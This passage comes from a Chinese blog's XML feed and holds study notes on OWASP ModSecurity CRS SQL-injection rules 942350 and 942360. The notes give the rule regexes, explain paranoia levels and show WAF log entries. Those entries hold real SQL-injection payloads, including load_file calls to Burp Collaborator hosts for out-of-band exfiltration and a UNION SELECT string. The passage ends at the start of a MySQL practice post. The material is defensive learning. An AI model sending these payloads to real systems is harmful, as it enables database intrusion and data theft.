tag:&#x27;platform-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;attack-sqli&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;paranoia-level/1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_CRS&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;WASCTC/WASC-19&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_TOP_10/A1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_AppSensor/CIE1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;PCI/6.5.2&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    ver:&#x27;OWASP_CRS/3.2.0&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    severity:&#x27;CRITICAL&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    setvar:&#x27;tx.sql_injection_score=+%&#123;tx.critical_anomaly_score&#125;&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    setvar:&#x27;tx.anomaly_score_pl1=+%&#123;tx.critical_anomaly_score&#125;&#x27;&quot;</span></span></span><br></pre></td></tr></table></figure>

</p>
</details>

<p>这条规则的正则表达式由<code>F:\学习资料\owasp-modsecurity-crs-3.3-dev\owasp-modsecurity-crs-3.3-dev\util\regexp-assemble\regexp-942350.data</code>生成。</p>
<details><summary>点击展开regexp-942350.data</summary>
<p>

<figure class="highlight re"><table><tr><td class="code"><pre><span class="line">create\s+<span class="keyword">function</span>\s+.+\s+returns</span><br><span class="line">;\s*?alter\b\s*?<span class="literal">[\[(]</span>?\w&#123;<span class="number">2</span>,&#125;</span><br><span class="line">;\s*?create\b\s*?<span class="literal">[\[(]</span>?\w&#123;<span class="number">2</span>,&#125;</span><br><span class="line">;\s*?delete\b\s*?<span class="literal">[\[(]</span>?\w&#123;<span class="number">2</span>,&#125;</span><br><span class="line">;\s*?desc\b\s*?<span class="literal">[\[(]</span>?\w&#123;<span class="number">2</span>,&#125;</span><br><span class="line">;\s*?insert\b\s*?<span class="literal">[\[(]</span>?\w&#123;<span class="number">2</span>,&#125;</span><br><span class="line">;\s*?load\b\s*?<span class="literal">[\[(]</span>?\w&#123;<span class="number">2</span>,&#125;</span><br><span class="line">;\s*?rename\b\s*?<span class="literal">[\[(]</span>?\w&#123;<span class="number">2</span>,&#125;</span><br><span class="line">;\s*?select\b\s*?<span class="literal">[\[(]</span>?\w&#123;<span class="number">2</span>,&#125;</span><br><span class="line">;\s*?truncate\b\s*?<span class="literal">[\[(]</span>?\w&#123;<span class="number">2</span>,&#125;</span><br><span class="line">;\s*?update\b\s*?<span class="literal">[\[(]</span>?\w&#123;<span class="number">2</span>,&#125;</span><br></pre></td></tr></table></figure>

</p>
</details>

<p><code>msg:&#39;Detects MySQL UDF injection and other data/structure manipulation attempts&#39;</code>这条规则检测MySQL UDF注入以及其他的数据/结构操作尝试。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matched Data: ;selectKpiId found within ARGS_NAMES:amp;selectKpiId: amp;selectKpiId</span><br></pre></td></tr></table></figure>
<p>匹配的变量是参数名称（ARGS_NAMES），匹配的数据是<code>;selectKpiId</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd2xjklidbj30hh08zglz.jpg" alt="image.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>规则不复杂，但是因为对正则表达式不熟悉，还不知道不同规则对select这个关键字的匹配有什么区别。<br>什么是<a href="https://xz.aliyun.com/t/2167">MySQL UDF注入</a></p>
]]></content>
      <categories>
        <category>Modsecurity</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>modsecurity</tag>
        <tag>crs防护规则</tag>
        <tag>SQL注入</tag>
        <tag>ruleid=942350</tag>
      </tags>
  </entry>
  <entry>
    <title>modsecurity防护crs规则学习之SQL注入-ruleid=942360</title>
    <url>//posts/ZH-CN/Modsecurity-Crs-Rules-SQLInjection-Ruleid-942360.html</url>
    <content><![CDATA[<h2 id="防护规则学习之SQL注入"><a href="#防护规则学习之SQL注入" class="headerlink" title="防护规则学习之SQL注入"></a>防护规则学习之SQL注入</h2><div class="note info">
            <ul><li>攻击类型：注入攻击</li><li>ruleid: 942360</li></ul>
          </div>

<p><escape> <span id="more"></span></escape></p>
<h3 id="规则配置文件"><a href="#规则配置文件" class="headerlink" title="规则配置文件"></a>规则配置文件</h3><p>我直接从<a href="https://github.com/SpiderLabs/owasp-modsecurity-crs">github</a>下载了<code>owasp-modsecurity-crs-3.3</code>的源码。<br>规则配置文件位于：<code>F:\学习资料\owasp-modsecurity-crs-3.3-dev\owasp-modsecurity-crs-3.3-dev\rules\REQUEST-942-APPLICATION-ATTACK-SQLI.conf</code></p>
<details><summary>点击展开ruleid=942360的配置内容</summary>
<p>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> This rule has a stricter sibling: 942361.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> The keywords <span class="string">&#x27;alter&#x27;</span> and <span class="string">&#x27;union&#x27;</span> led to <span class="literal">false</span> positives.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Therefore they have been moved to PL2 and the keywords have been extended on PL1.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># Sources for SQL ALTER statements:</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> MySQL: https://dev.mysql.com/doc/refman/5.7/en/sql-syntax-data-definition.html</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Oracle/PLSQL: https://docs.oracle.com/apps/search/search.jsp?q=alter&amp;size=60&amp;category=database</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> PostgreQSL: https://www.postgresql.org/search/?u=%2Fdocs&amp;q=alter</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> MSSQL: https://docs.microsoft.com/en-us/sql/t-sql/statements/statements</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> DB2: https://www.ibm.com/support/knowledgecenter/en/search/alter?scope=SSEPGG_9.5.0</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># Regexp generated from util/regexp-assemble/regexp-942360.data using Regexp::Assemble.</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> To rebuild the regexp:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   <span class="built_in">cd</span> util/regexp-assemble</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   ./regexp-assemble.pl regexp-942360.data</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Note that after assemble an outer bracket with an ignore <span class="keyword">case</span> flag is added</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> to the Regexp::Assemble output:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   (?i:ASSEMBLE_OUTPUT)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash">SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* <span class="string">&quot;@rx (?i:(?:^[\W\d]+\s*?(?:(?:alter\s*(?:a(?:(?:pplication\s*rol|ggregat)e|s(?:ymmetric\s*ke|sembl)y|u(?:thorization|dit)|vailability\s*group)|c(?:r(?:yptographic\s*provider|edential)|o(?:l(?:latio|um)|nversio)n|ertificate|luster)|s(?:e(?:rv(?:ice|er)|curity|quence|ssion|arch)|y(?:mmetric\s*key|nonym)|togroup|chema)|m(?:a(?:s(?:ter\s*key|k)|terialized)|e(?:ssage\s*type|thod)|odule)|l(?:o(?:g(?:file\s*group|in)|ckdown)|a(?:ngua|r)ge|ibrary)|t(?:(?:abl(?:espac)?|yp)e|r(?:igger|usted)|hreshold|ext)|p(?:a(?:rtition|ckage)|ro(?:cedur|fil)e|ermission)|d(?:i(?:mension|skgroup)|atabase|efault|omain)|r(?:o(?:l(?:lback|e)|ute)|e(?:sourc|mot)e)|f(?:u(?:lltext|nction)|lashback|oreign)|e(?:xte(?:nsion|rnal)|(?:ndpoi|ve)nt)|in(?:dex(?:type)?|memory|stance)|b(?:roker\s*priority|ufferpool)|x(?:ml\s*schema|srobject)|w(?:ork(?:load)?|rapper)|hi(?:erarchy|stogram)|o(?:perator|utline)|(?:nicknam|queu)e|us(?:age|er)|group|java|view)|u(?:nion\s*(?:(?:distin|sele)ct|all)|pdate)|(?:truncat|renam)e|(?:inser|selec)t|de(?:lete|sc)|load)\b|create\s+\w+)|(?:(?:(?:trunc|cre|upd)at|renam)e|(?:inser|selec)t|de(?:lete|sc)|alter|load)\s+(?:group_concat|load_file|char)\s?\(?|[\d\W]\s+as\b\s*[\&quot;&#x27;`\w]+\s*\bfrom|[\s(]load_file\s*?\(|[\&quot;&#x27;`]\s+regexp\W|end\s*?\);))&quot;</span> \</span></span><br><span class="line"><span class="bash">    <span class="string">&quot;id:942360,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    phase:2,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    block,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    capture,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    t:none,t:urlDecodeUni,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    msg:&#x27;Detects concatenated basic SQL injection and SQLLFI attempts&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    logdata:&#x27;Matched Data: %&#123;TX.0&#125; found within %&#123;MATCHED_VAR_NAME&#125;: %&#123;MATCHED_VAR&#125;&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;application-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;language-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;platform-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;attack-sqli&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;paranoia-level/1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_CRS&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;WASCTC/WASC-19&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_TOP_10/A1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_AppSensor/CIE1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;PCI/6.5.2&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    ver:&#x27;OWASP_CRS/3.2.0&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    severity:&#x27;CRITICAL&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    setvar:&#x27;tx.sql_injection_score=+%&#123;tx.critical_anomaly_score&#125;&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    setvar:&#x27;tx.anomaly_score_pl1=+%&#123;tx.critical_anomaly_score&#125;&#x27;&quot;</span></span></span><br></pre></td></tr></table></figure>

</p>
</details>

<p>这条规则的正则表达式由<code>F:\学习资料\owasp-modsecurity-crs-3.3-dev\owasp-modsecurity-crs-3.3-dev\util\regexp-assemble\regexp-942360.data</code>生成：</p>
<details><summary>点击展开regexp-942360.data</summary>
<p>

<figure class="highlight re"><table><tr><td class="code"><pre><span class="line">alter\s+<span class="built_in">char</span>\s?<span class="literal">[(]</span>?</span><br><span class="line">alter\s+group_concat\s?<span class="literal">[(]</span>?</span><br><span class="line">alter\s+load_file\s?<span class="literal">[(]</span>?</span><br><span class="line">create\s+<span class="built_in">char</span>\s?<span class="literal">[(]</span>?</span><br><span class="line">create\s+group_concat\s?<span class="literal">[(]</span>?</span><br><span class="line">create\s+load_file\s?<span class="literal">[(]</span>?</span><br><span class="line">delete\s+<span class="built_in">char</span>\s?<span class="literal">[(]</span>?</span><br><span class="line">delete\s+group_concat\s?<span class="literal">[(]</span>?</span><br><span class="line">delete\s+load_file\s?<span class="literal">[(]</span>?</span><br><span class="line">desc\s+<span class="built_in">char</span>\s?<span class="literal">[(]</span>?</span><br><span class="line">desc\s+group_concat\s?<span class="literal">[(]</span>?</span><br><span class="line">desc\s+load_file\s?<span class="literal">[(]</span>?</span><br><span class="line">insert\s+<span class="built_in">char</span>\s?<span class="literal">[(]</span>?</span><br><span class="line">insert\s+group_concat\s?<span class="literal">[(]</span>?</span><br><span class="line">insert\s+load_file\s?<span class="literal">[(]</span>?</span><br><span class="line">load\s+<span class="built_in">char</span>\s?<span class="literal">[(]</span>?</span><br><span class="line">load\s+group_concat\s?<span class="literal">[(]</span>?</span><br><span class="line">load\s+load_file\s?<span class="literal">[(]</span>?</span><br><span class="line">rename\s+<span class="built_in">char</span>\s?<span class="literal">[(]</span>?</span><br><span class="line">rename\s+group_concat\s?<span class="literal">[(]</span>?</span><br><span class="line">rename\s+load_file\s?<span class="literal">[(]</span>?</span><br><span class="line">select\s+<span class="built_in">char</span>\s?<span class="literal">[(]</span>?</span><br><span class="line">select\s+group_concat\s?<span class="literal">[(]</span>?</span><br><span class="line">select\s+load_file\s?<span class="literal">[(]</span>?</span><br><span class="line">truncate\s+<span class="built_in">char</span>\s?<span class="literal">[(]</span>?</span><br><span class="line">truncate\s+group_concat\s?<span class="literal">[(]</span>?</span><br><span class="line">truncate\s+load_file\s?<span class="literal">[(]</span>?</span><br><span class="line">update\s+<span class="built_in">char</span>\s?<span class="literal">[(]</span>?</span><br><span class="line">update\s+group_concat\s?<span class="literal">[(]</span>?</span><br><span class="line">update\s+load_file\s?<span class="literal">[(]</span>?</span><br><span class="line"><span class="keyword">end</span>\s*?\);</span><br><span class="line"><span class="literal">[\<span class="identifier">s</span>(]</span>load_file\s*?\(</span><br><span class="line"><span class="literal">[\&quot;&#x27;`]</span>\s+regexp\W</span><br><span class="line"><span class="literal">[\<span class="identifier">d</span>\W]</span>\s+<span class="keyword">as</span>\b\s*<span class="literal">[\&quot;&#x27;`\<span class="identifier">w</span>]</span>+\s*\bfrom</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?create\s+\w+</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?delete\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?desc\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?insert\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?load\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?rename\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?select\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?truncate\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?update\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*aggregate\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*application\s*role\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*assembly\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*asymmetric\s*key\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*audit\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*authorization\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*availability\s*group\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*broker\s*priority\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*bufferpool\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*certificate\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*cluster\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*collation\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*column\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*conversion\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*credential\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*cryptographic\s*provider\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*database\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*default\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*dimension\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*diskgroup\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*domain\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*endpoint\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*extension\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*<span class="keyword">external</span>\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*event\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*flashback\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*foreign\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*fulltext\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*<span class="keyword">function</span>\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*hierarchy\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*group\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*histogram\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*index\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*indextype\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*inmemory\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*instance\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*java\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*language\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*large\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*library\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*lockdown\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*logfile\s*group\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*login\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*mask\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*master\s*key\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*materialized\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*message\s*<span class="keyword">type</span>\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*<span class="keyword">method</span>\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*<span class="keyword">module</span>\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*nickname\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*operator\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*outline\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*package\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*partition\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*permission\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*procedure\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*profile\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*queue\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*remote\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*resource\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*role\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*rollback\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*route\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*schema\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*search\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*security\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*server\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*service\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*sequence\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*session\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*symmetric\s*key\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*synonym\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*stogroup\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*table\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*tablespace\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*text\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*threshold\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*trigger\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*trusted\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*<span class="keyword">type</span>\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*usage\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*user\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*view\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*work\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*workload\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*wrapper\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*xml\s*schema\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?alter\s*xsrobject\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?union\s*all\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?union\s*select\b</span><br><span class="line">^<span class="literal">[\W\<span class="identifier">d</span>]</span>+\s*?union\s*distinct\b</span><br></pre></td></tr></table></figure>

</p>
</details>

<blockquote>
<p>这条规则提到了一个概念PL1和PL2。google了一下，<a href="https://l0gs.xf0rk.space/2018/12/21/step-into-modsecurity/">原来是这样的</a><br>在异常评分模式中，CRS包含规则等级（Paranoia）、异常阈值（Anomaly）两个量化值，随着规则等级越来越高，其所启用的安全防御规则就越来越多，同时误报也会越来越多，规则等级分为以下几类，规则等级高于PL2在审计日志中会输出规则等级标签：</p>
</blockquote>
<ul>
<li>1（PL1），默认风险等级，启用了大部分防御规则，误报较少</li>
<li>2（PL2），比 PL1 启用更多防御规则，例如基于正则的 SQL 注入和 XSS，比 PL1 误报多</li>
<li>3（PL3），比 PL2 启用更多防御规则，面向经验丰富用户，满足较高安全性场景</li>
<li>4（PL4），最严格的风险等级，会产生一定数量的误报<br>基于异常告警模式，每条检测规则都包含一定的风险值，不同危害风险值不同，如下所示，可根据业务场景自主调整：</li>
<li>CRITICAL，致命，风险值为 5</li>
<li>ERROR，错误，风险值为 4</li>
<li>WARNING，警告，风险值为 3</li>
<li>NOTICE，通知，风险值为 2</li>
</ul>
<p>这条规则，也告诉我们<code>alter</code>和<code>union</code>对应的正则匹配容易误报。<br><code>msg:&#39;Detects concatenated basic SQL injection and SQLLFI attempts&#39;</code>这条规则用于检测连接类SQL注入和SQLLFI尝试。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><ul>
<li>例子1：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matched Data: 1&#x27; (select found within ARGS_NAMES:1&#x27;+(select load_file(&#x27;\x5c\x5c\x5c\x5c\x5c\x5c\x5c\x5cbm1n3x0mqhp9aerbe1qga1kz4qagy71vvil6a.burpcollaborator.net\x5c\x5c\x5c\x5cumz&#x27;))+&#x27;: 1&#x27; (select load_file(&#x27;\x5c\x5c\x5c\x5cbm1n3x0mqhp9aerbe1qga1kz4qagy71vvil6a.burpcollaborator.net\x5c\x5cumz&#x27;)) &#x27;</span><br></pre></td></tr></table></figure>
匹配的变量是参数名称（ARGS_NAMES），匹配的数据是<code>1&#39; (select</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd2wek086mj30li0jp3zp.jpg" alt="image.png"></li>
<li>例子2：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matched Data: select load_file( found within REQUEST_COOKIES:JSESSIONID: BF1261B18F17E3A1B16BACE4B6055F35&#x27;+(select load_file(&#x27;\x5c\x5c\x5c\x5cpha1ybv0lvkn5smp9flu5ffdz45utlw9pwfk4.burpcollaborator.net\x5c\x5clpy&#x27;))+&#x27;</span><br></pre></td></tr></table></figure>
匹配的变量是请求COOKIE（REQUEST_COOKIES），匹配的数据是<code>select load_file(</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd2wfr2s78j30lp0mhjsp.jpg" alt="image.png"></li>
<li>例子3：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matched Data: -1\x22)UnIoN found within ARGS:kw: -1\x22)UnIoN/**/AlL/**/SeLeCt/**/1,2,3,Md5(1234),5,6,7#</span><br></pre></td></tr></table></figure>
匹配的变量是post提交的参数（ARGS），参数名称是<code>kw</code>，匹配的数据是<code>-1\x22)UnIoN</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd2wke8098j30l70gsdgu.jpg" alt="image.png"></li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这条规则就相对复杂很多了。</p>
]]></content>
      <categories>
        <category>Modsecurity</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>modsecurity</tag>
        <tag>crs防护规则</tag>
        <tag>SQL注入</tag>
        <tag>ruleid=942360</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql查询练习</title>
    <url>//posts/ZH-CN/mysql_query.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于学习Mysql的学习想法已经有一年多了，然而现在还是只会简单的<code>select * from database where id =1</code>这种查询语句，很惭愧。很久没有写博客了，转眼间博客已经运行近1年时间。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="查询语法"><a href="#查询语法" class="headerlink" title="查询语法"></a>查询语法</h2><ol>
<li>基础语法</li>
</ol>
<ul>
<li><p>创建数据库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database `my_data` charset<span class="operator">=</span>utf8;</span><br></pre></td></tr></table></figure></li>
